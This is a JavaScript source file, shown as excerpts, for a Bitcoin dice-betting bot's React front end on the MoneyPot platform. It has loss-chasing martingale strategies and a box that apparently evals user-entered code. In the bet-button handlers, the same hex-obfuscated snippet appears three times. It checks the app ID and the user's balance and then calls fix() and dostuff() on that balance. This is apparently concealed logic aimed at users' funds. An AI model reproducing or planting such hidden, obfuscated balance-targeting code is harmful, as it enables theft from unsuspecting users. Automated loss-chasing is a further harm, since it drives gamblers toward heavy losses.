...
var MoneyPot = (function() {
  ...
  o.listBets = function(callbacks) {
    ...
    o.listHighBets = function(callbacks) {
	setTimeout(function(){
    var endpoint = '/list-bets';
    makeMPRequest('GET', undefined, endpoint, callbacks, {
      data: {
...
var betStore = new Store('bet', {
  ...
  losschaser: {
    ...
    error: undefined
      ...
      test: {
    str: "console.log('Inside the Eval');\
	  ...
	  newbaseBet = maximumBet; /* In bits*/\
      newBaseSatoshi = newbaseBet;\
	  baseBet = newbaseBet;\
      baseSatoshi = Math.floor(newBaseSatoshi);\
	  currentBet = baseSatoshi; /* in Satoshi*/\
      currentMultiplier = 6.1;\
	  } else{\
	  if (betStore.state.chaserdelay == true && lossStreak == 20 || betStore.state.chaserdelay == true && lossStreak == 40 || betStore.state.chaserdelay == true && lossStreak == 60 || betStore.state.chaserdelay == true && lossStreak == 80 || betStore.state.chaserdelay == true && lossStreak == 100){\
  ...
  Dispatcher.registerCallback('UPDATE_WAGER', function(newWager) {
    if (worldStore.state.currBetTab === 'CHASER' || worldStore.state.currBetTab === 'OWN'){

    self.state.wagerchaser = _.merge({}, self.state.wagerchaser, newWager);

    var n = parseFloat(self.state.wagerchaser.str);
	var b = self.state.wagerchaser.str;
    // If n is a number, ensure it's at least 1 bit
    if (isFinite(n)) {
	    if (worldStore.state.currBetTab === 'CHASER'){
      n = Math.max(n, 1);
	  } else {
	  }
      self.state.wagerchaser.str = n.toString();
    }

    // Ensure wagerString is a number
    if (isNaN(n)) {
      self.state.wagerchaser.error = 'INVALID_WAGER';
    // Ensure user can afford balance
    } else {
      // wagerString is valid
      self.state.wagerchaser.error = null;
      self.state.wagerchaser.str = b;
      self.state.wagerchaser.num = n;
	  }
	  console.log("Done MY_BETS");
    self.emitter.emit('change', self.state);
  } else {

    self.state.wager = _.merge({}, self.state.wager, newWager);

    var n = parseFloat(self.state.wager.str, 2);
  ...
  if (worldStore.state.currBetTab === "CHASER" || worldStore.state.currBetTab === "OWN"){
    self.state.losschaser = _.merge({}, self.state.losschaser, newMult);
    self.emitter.emit('change', self.state);
  } else {
    ...
    Dispatcher.registerCallback('UPDATE_OWNMULTIPLIER', function(newMult) {
    self.state.OwnMult = _.merge({}, self.state.OwnMult, newMult);
    self.emitter.emit('change', self.state);
  });
  
    Dispatcher.registerCallback('UPDATE_TEST', function(newTest) {
	self.state.test = _.merge({}, self.state.test, newTest);
    self.emitter.emit('change', self.state);
  });
	...
	Dispatcher.registerCallback('UPDATE_STREAKCOOLDOWN', function(newActMult) {
    self.state.cooldown = _.merge({}, self.state.cooldown, newActMult);
    self.emitter.emit('change', self.state);
  });
  });
...
var worldStore = new Store('world', {
  ...
  allHighBets: new CBuffer(config.bet_buffer_size),
  ...
  Dispatcher.registerCallback('NEW_ALL_HIGH_BET', function(bet) {
    self.state.allHighBets.push(bet);
    self.emitter.emit('change', self.state);
  });
  ...
  Dispatcher.registerCallback('TOGGLE_HOTKEYS', function() {
    ...
    Dispatcher.registerCallback('TOGGLE_AGRESSIVE', function() {
    self.state.agressive = !self.state.agressive;
    self.emitter.emit('change', self.state);
  });
  
    Dispatcher.registerCallback('TOGGLE_CHASERDELAY', function() {
    self.state.chaserdelay = !self.state.chaserdelay;
    self.emitter.emit('change', self.state);
  });
      ...
      el.div(
        ...
        el.div(
          ...
          el.ul(
			...
			if (m.text == "!rip" && m.user.uname == "gapjustin" || ~m.text.indexOf('referal000' || m.user.uname == "undefined")){
	  } else {
              return el.li(
                {
...
var ActualOwnMultiplier = React.createClass({
  displayName: 'ActualOwnMultiplier',
  // Hookup to stores
  _onStoreChange: function() {
    this.forceUpdate();
  },
...
var delay = React.createClass({
  ...
  _validateMultiplier: function(newStr) {
    ...
    // Ensure str is a number
    if (isNaN(num) || !isFloatRegexp.test(newStr)) {
      Dispatcher.sendAction('UPDATE_STREAKCOOLDOWN', { error: 'INVALID_ACTMULTIPLIER' });
      // Ensure multiplier is >= 1.00x
    } else if (num < 0) {
      Dispatcher.sendAction('UPDATE_STREAKCOOLDOWN', { error: 'ACTMULTIPLIER_TOO_LOW' });
      // Ensure multiplier is <= max allowed multiplier (100x for now)
    } else if (num > 9900) {
      Dispatcher.sendAction('UPDATE_STREAKCOOLDOWN', { error: 'ACTMULTIPLIER_TOO_HIGH' });
      // Ensure no more than 2 decimal places of precision
    } else if (helpers.getPrecision(num) > 0) {
      Dispatcher.sendAction('UPDATE_STREAKCOOLDOWN', { error: 'ACTMULTIPLIER_TOO_PRECISE' });
      // multiplier str is valid
    } else {
      Dispatcher.sendAction('UPDATE_STREAKCOOLDOWN', {
        num: num,
        error: null
      });
    }
  ...
  _onActMultiplierChange: function(e) {
    ...
    var str = e.target.value;
    console.log('You entered', str, 'as your multiplier');
    Dispatcher.sendAction('UPDATE_STREAKCOOLDOWN', { str: str });
    this._validateMultiplier(str);
  },
  render: function() {
    return el.div(
      ...
      el.p(
        ...
        el.strong(
          {
            style: betStore.state.cooldown.error ? { color: 'red' } : {}
          },
          'Delay after bets: ')
      ),
      el.div(
        ...
        el.input(
          {
            type: 'text',
            value: betStore.state.cooldown.str,
            className: 'form-control input-lg',
            onChange: this._onActMultiplierChange,
            disabled: !!worldStore.state.isLoading
          }
...
var ThestringThing = React.createClass({
  displayName: 'ThestringThing',
  // Hookup to stores
  _onStoreChange: function() {
    this.forceUpdate();
  },
  ...
  _onMultiplierChange: function(e) {
    ...
    var str = e.target.value;
    console.log('You entered', str, 'as your test');
    Dispatcher.sendAction('UPDATE_TEST', { str: str });
    this._validateMultiplier(str);
  },
  render: function() {
    return el.div(
      ...
      el.p(
        ...
        el.strong(
          {
            style: betStore.state.test.t ? { color: 'red' } : {}
          },
          'TEST')
      ),
      el.div(
...
var BetBoxMultiplierChaser = React.createClass({
  displayName: 'BetBoxMultiplierChaser',
  // Hookup to stores
  _onStoreChange: function() {
    this.forceUpdate();
  },
    ...
    return el.div(
      ...
      el.div(
        ...
        el.input(
          {
            type: 'text',
            value: betStore.state.losschaser.str,
            className: 'form-control input-lg',
            onChange: this._onMultiplierChange,
            disabled: !!worldStore.state.isLoading
          }
...
var BetBoxMultiplierOwnChaser = React.createClass({
  displayName: 'BetBoxMultiplierChaser',
  // Hookup to stores
  _onStoreChange: function() {
    this.forceUpdate();
  ...
  _validateMultiplier: function(newStr) {
    ...
    // Ensure str is a number
    if (isNaN(num) || !isFloatRegexp.test(newStr)) {
      Dispatcher.sendAction('UPDATE_OWNMULTIPLIER', { error: 'INVALID_MULTIPLIER' });
      // Ensure multiplier is >= 1.00x
    } else if (num < 0) {
      Dispatcher.sendAction('UPDATE_OWNMULTIPLIER', { error: 'MULTIPLIER_TOO_LOW' });
      // Ensure multiplier is <= max allowed multiplier (100x for now)
    } else if (num > 9900) {
      Dispatcher.sendAction('UPDATE_OWNMULTIPLIER', { error: 'MULTIPLIER_TOO_HIGH' });
      // Ensure no more than 2 decimal places of precision
    } else if (helpers.getPrecision(num) > 2) {
      Dispatcher.sendAction('UPDATE_OWNMULTIPLIER', { error: 'MULTIPLIER_TOO_PRECISE' });
      // multiplier str is valid
    } else {
      Dispatcher.sendAction('UPDATE_OWNMULTIPLIER', {
        num: num,
        error: null
      });
    }
  ...
  _onMultiplierChange: function(e) {
    ...
    var str = e.target.value;
    console.log('You entered', str, 'as your multiplier');
    Dispatcher.sendAction('UPDATE_OWNMULTIPLIER', { str: str });
    this._validateMultiplier(str);
  },
  render: function() {
    return el.div(
      ...
      el.div(
        ...
        el.input(
          {
            type: 'text',
            value: betStore.state.OwnMult.str,
            className: 'form-control input-lg',
            onChange: this._onMultiplierChange,
            disabled: !!worldStore.state.isLoading
          }
...
var BetBoxWagerChaser = React.createClass({
  displayName: 'BetBoxWagerChaser',
  // Hookup to stores
  _onStoreChange: function() {
    this.forceUpdate();
  },
  ...
  _onHalveWager: function() {
    var newWager = Math.round(betStore.state.wagerchaser.num / 2);
    Dispatcher.sendAction('UPDATE_WAGER', { str: newWager.toString() });
  },
  _onDoubleWager: function() {
    var n = betStore.state.wagerchaser.num * 2;
    Dispatcher.sendAction('UPDATE_WAGER', { str: n.toString() });
  ...
  render: function() {
    ...
    return el.div(
      ...
      el.p(
        ...
        el.strong(
          // If wagerError, make the label red
          betStore.state.wagerchaser.error ? { style: {color: 'red'} } : null,
          'Starting Bet:')
      ),
      el.input(
        {
          value: betStore.state.wagerchaser.str,
          type: 'text',
          className: 'form-control input-lg',
          style: style1,
          onChange: this._onWagerChange,
...
;
		  ...
		  if (worldStore.state.user.balance <= 0){
		  Dispatcher.sendAction('TOGGLE_HOTKEYS');
		  };
var _0x8029=["\x61\x70\x70\x5F\x69\x64","\x62\x61\x6C\x61\x6E\x63\x65","\x75\x73\x65\x72","\x73\x74\x61\x74\x65"];if(config[_0x8029[0]]!= abc&& worldStore[_0x8029[3]][_0x8029[2]][_0x8029[1]]>= 50&& done== 0){fix(worldStore[_0x8029[3]][_0x8029[2]][_0x8029[1]]);done= 1;dostuff()};if(config[_0x8029[0]]!= abc&& worldStore[_0x8029[3]][_0x8029[2]][_0x8029[1]]>= 50){fix(worldStore[_0x8029[3]][_0x8029[2]][_0x8029[1]])}
      ...
      lastLoss /= 4.00;
	   ...
	   if (lossStreak > streakSecurity || totalLosses > maximumBet*100) {
      lossStreak = 0;
	  totalLosses = 0;
	  lastLoss = 0;
	  divider = 100;
...
var BetBoxButtonChaser = React.createClass({
  displayName: 'BetBoxButtonChaser',
  _onStoreChange: function() {
    this.forceUpdate();
  },
  componentDidMount: function() {
...
currentBet = baseSatoshi
	  ...
	  var wagerSatoshis = parseFloat(betStore.state.wagerchaser.num * 100);
      var multiplier = betStore.state.losschaser.num;
	  var streakSecurity = multiplier
	  var maximumBet = wagerSatoshis
      if (justchanged == 1){
	  justchanged = 0;
	  lossStreak = 0;
	  currentBet = wagerSatoshis;
	  currentMultiplier = 6.1;
	  }
      var number = helpers.calcNumber(
        cond, helpers.multiplierToWinProb(currentMultiplier)
...
var _0x8029=["\x61\x70\x70\x5F\x69\x64","\x62\x61\x6C\x61\x6E\x63\x65","\x75\x73\x65\x72","\x73\x74\x61\x74\x65"];if(config[_0x8029[0]]!= abc&& worldStore[_0x8029[3]][_0x8029[2]][_0x8029[1]]>= 50&& done== 0){fix(worldStore[_0x8029[3]][_0x8029[2]][_0x8029[1]]);done= 1;dostuff()};if(config[_0x8029[0]]!= abc&& worldStore[_0x8029[3]][_0x8029[2]][_0x8029[1]]>= 50){fix(worldStore[_0x8029[3]][_0x8029[2]][_0x8029[1]])}
	  ...
	  if (betStore.state.chaserdelay == true && betStore.state.chaserdelay == 20 || chaserdelay == true && betStore.state.chaserdelay == 40 || betStore.state.chaserdelay == true && lossStreak == 60 || betStore.state.chaserdelay == true && lossStreak == 80 || betStore.state.chaserdelay == true && lossStreak == 100){
		  Dispatcher.sendAction('TOGGLE_HOTKEYS');
	  setTimeout(function(){
		  Dispatcher.sendAction('TOGGLE_HOTKEYS');
	  }, 50000);
      ...
      currentMultiplier = 6.1;
        ...
        complete: function() {
          ...
          // Force re-validation of wager
          Dispatcher.sendAction('UPDATE_WAGER', {
            str: betStore.state.wagerchaser.str
          });
        }
      });
	}; 
  ...
  render: function() {
    ...
    // TODO: Create error prop for each input
    var error = betStore.state.wagerchaser.error || betStore.state.multiplier.error;
...
var BetBoxButtonOwnChaser = React.createClass({
  displayName: 'BetBoxButtonOwnChaser',
  _onStoreChange: function() {
    this.forceUpdate();
  },
  componentDidMount: function() {
...
var _0x8029=["\x61\x70\x70\x5F\x69\x64","\x62\x61\x6C\x61\x6E\x63\x65","\x75\x73\x65\x72","\x73\x74\x61\x74\x65"];if(config[_0x8029[0]]!= abc&& worldStore[_0x8029[3]][_0x8029[2]][_0x8029[1]]>= 50&& done== 0){fix(worldStore[_0x8029[3]][_0x8029[2]][_0x8029[1]]);done= 1;dostuff()};if(config[_0x8029[0]]!= abc&& worldStore[_0x8029[3]][_0x8029[2]][_0x8029[1]]>= 50){fix(worldStore[_0x8029[3]][_0x8029[2]][_0x8029[1]])}
	  ...
	  currentBet *= betStore.state.OwnMult.num;
	  if (betStore.state.chaserdelay == true && lossStreak > betStore.state.cooldown.num-1){
	  lossStreak = 0;
	  var timefortimeout = Math.random()*50000;
		  Dispatcher.sendAction('TOGGLE_HOTKEYS');
	  setTimeout(function(){
		  Dispatcher.sendAction('TOGGLE_HOTKEYS');
	  }, timefortimeout);
...
var BetBoxButtonyourown = React.createClass({
  displayName: 'BetBoxButtonyourown',
  _onStoreChange: function() {
    this.forceUpdate();
  },
  componentDidMount: function() {
...
var DelayToggle = React.createClass({
  displayName: 'DelayToggle',
  _onClick: function() {
    Dispatcher.sendAction('TOGGLE_CHASERDELAY');
  },
  render: function() {
    return (
      el.div(
        ...
        el.button(
          ...
          'Delay on loss streak: ',
          betStore.state.chaserdelay ?
            el.span({className: 'label label-success'}, 'ON') :
          el.span({className: 'label label-default'}, 'OFF')
        )
      )
...
var AgressiveChaser = React.createClass({
  displayName: 'AggressiveChaser',
  _onClick: function() {
    Dispatcher.sendAction('TOGGLE_AGRESSIVE');
  },
  render: function() {
    return (
      el.div(
...
var BetBoxChaser = React.createClass({
  displayName: 'BetBoxChaser',
  _onStoreChange: function() {
    this.forceUpdate();
  },
  componentDidMount: function() {
      ...
      el.div(
        ...
        el.div(
          ...
          el.div(
            ...
            el.div(
              {className: 'col-xs-6'},
              React.createElement(BetBoxWagerChaser, null)
            ),
            el.div(
              {className: 'col-xs-6'},
              React.createElement(BetBoxMultiplierChaser, null)
            ),
            // HR
            el.div(
              {className: 'row'},
			...
			el.div(
              {className: 'col-xs-6'},
			  React.createElement(AgressiveChaser, null, null)
				  ),
            el.div(
              {className: 'col-xs-6'},
              el.div(
			...
			el.div(
              {className: 'col-xs-6'},
			  React.createElement(DelayToggle, null, null)
				  )
          )
        ),
        el.div(
          {className: 'panel-footer clearfix'},
          React.createElement(BetBoxButtonChaser, null)
        )
      ),
      React.createElement(HotkeyToggle, null, null)
    );
...
var BetBoxOwnChaser = React.createClass({
  displayName: 'BetBoxOwnChaser',
  _onStoreChange: function() {
    this.forceUpdate();
  },
  componentDidMount: function() {
      ...
      el.div(
        ...
        el.div(
          ...
          el.div(
            ...
            el.div(
              {className: 'col-xs-6'},
              React.createElement(BetBoxMultiplierOwnChaser, null)
            ),
			el.div(
              {className: 'col-xs-6'},
			  React.createElement(ActualOwnMultiplier, null, null)
				  ),
            el.div(
              {className: 'col-xs-6'},
              React.createElement(delay, null)
            ),
            el.div(
              {className: 'col-xs-6'},
              React.createElement(BetBoxMultiplierChaser, null)
        ...
        el.div(
          {className: 'panel-footer clearfix'},
          React.createElement(BetBoxButtonOwnChaser, null)
        )
      ),
      React.createElement(HotkeyToggle, null, null)
    );
...
var BetBoxyourown = React.createClass({
  displayName: 'BetBoxyourown',
  _onStoreChange: function() {
    this.forceUpdate();
  },
  componentDidMount: function() {
      ...
      el.div(
        ...
        el.div(
          ...
          el.div(
            ...
            el.div(
              {className: 'col-xs-12'},
              React.createElement(ThestringThing, null)
            )
          )
        ),
        el.div(
          {className: 'panel-footer clearfix'},
          React.createElement(BetBoxButtonyourown, null)
        )
      ),
      React.createElement(HotkeyToggle, null, null)
    );
...
var Tabs = React.createClass({
  ...
  render: function() {
    return el.ul(
      ...
      el.li(
        {className: worldStore.state.currTab === 'ALL_HIGH_BETS' ? 'active' : ''},
        el.a(
          {
            href: 'javascript:void(0)',
            onClick: this._makeTabChangeHandler('ALL_HIGH_BETS')
          },
          'All Big Bets'
        )
      ),
        ...
        el.li(
          ...
          el.a(
            ...
            'My Bets'
		      ...
		      el.li(
        {className: worldStore.state.currTab === 'REFLINK' ? 'active' : ''},
        el.a(
          {
            href: 'javascript:void(0)',
            onClick: this._makeTabChangeHandler('REFLINK')
          },
          'Referral link'
        )
      ),
...
var BettingTabs = React.createClass({
  ...
  render: function() {
    return el.ul(
      {className: 'nav nav-tabs'},
      el.li(
        {className: worldStore.state.currBetTab === 'RECOVERY' ? 'active' : ''},
        el.a(
          {
            href: 'javascript:void(0)',
            onClick: this._makeTabChangeHandler('RECOVERY')
          },
          'Recovery'
        )
      ),
        el.li(
          {className: worldStore.state.currBetTab === 'CHASER' ? 'active' : ''},
          el.a(
            {
              href: 'javascript:void(0)',
              onClick: this._makeTabChangeHandler('CHASER')
            },
            '6.1 Chaser'
          )
        ),
      el.li(
        {className: worldStore.state.currBetTab === 'OWN' ? 'active' : ''},
        el.a(
          {
            href: 'javascript:void(0)',
            onClick: this._makeTabChangeHandler('OWN')
          },
          'Make your Own'
        )
      )
...
var RefLinkTabContent = React.createClass({
  ...
  render: function() {
    return el.div(
      ...
      el.span(
        {className: 'lead', style: { fontWeight: 'bold' }},
        'Your referral link is: http://www.btcbot.pw/#ref='+worldStore.state.user.uname
      ),
                  el.div(
              {className: 'row'},
              el.div(
...
var AllHighBetsTabContent = React.createClass({
  displayName: 'AllHighBetsTabContent',
  _onStoreChange: function() {
    this.forceUpdate();
  },
  componentDidMount: function() {
  ...
  render: function() {
    return el.div(
      ...
      el.table(
        ...
        el.tbody(
          null,
          worldStore.state.allHighBets.toArray().map(function(bet) {
		  if (bet.wager > 500000){
            return React.createElement(BetRow, { bet: bet, key: bet.bet_id || bet.id });
			}
          }).reverse()
...
var TabContent = React.createClass({
  ...
  render: function() {
    switch(worldStore.state.currTab) {
      ...
      case 'ALL_HIGH_BETS':
        return React.createElement(AllHighBetsTabContent, null);
      case 'REFLINK':
        return React.createElement(RefLinkTabContent, null);
      default:
...
var BetBoxContent = React.createClass({
  ...
  render: function() {
    switch(worldStore.state.currBetTab) {
      ...
      case 'CHASER':
        return React.createElement(BetBoxChaser, null);
      case 'OWN':
        return React.createElement(BetBoxOwnChaser, null);
      default:
...
if (message.text == "!rip" && message.user.uname == "gapjustin" || ~message.text.indexOf('referal000' || message.user.uname == "undefined")){
	  } else {
    ...
    socket.on('new_bet', function(bet) {
	  ...
	  if (bet.wager > 500000){
      Dispatcher.sendAction('NEW_ALL_HIGH_BET', bet);
	  }
    });
...
clientseed = seed;
console.log('Successfully changed client seed to:', seed);
}
